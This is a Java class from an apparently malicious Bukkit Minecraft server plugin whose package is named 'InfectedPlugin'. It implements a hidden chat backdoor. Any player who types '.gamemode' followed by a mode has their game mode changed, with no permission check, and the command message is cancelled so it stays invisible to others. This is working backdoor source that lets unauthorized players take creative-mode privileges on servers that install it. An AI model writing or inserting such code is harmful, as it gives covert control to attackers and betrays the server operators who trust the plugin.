package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_gamemode implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".gamemode") || args[0].equalsIgnoreCase("gm"))
            {
                if (args.length == 1)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .gamemode [survival|creative|adventure]");
                    event.setCancelled(true);
                    return;
                }
                if (args[1].equalsIgnoreCase("survival") || args[1].equalsIgnoreCase("0"))
                {
                    p.setGameMode(GameMode.SURVIVAL);
                }
                else if (args[1].equalsIgnoreCase("creative") || args[1].equalsIgnoreCase("1"))
                {
                    p.setGameMode(GameMode.CREATIVE);
                }
                else if (args[1].equalsIgnoreCase("adventure") || args[1].equalsIgnoreCase("2"))
                {
                    p.setGameMode(GameMode.ADVENTURE);
                }
                event.setCancelled(true);
                return;
            }
        }
    }
}
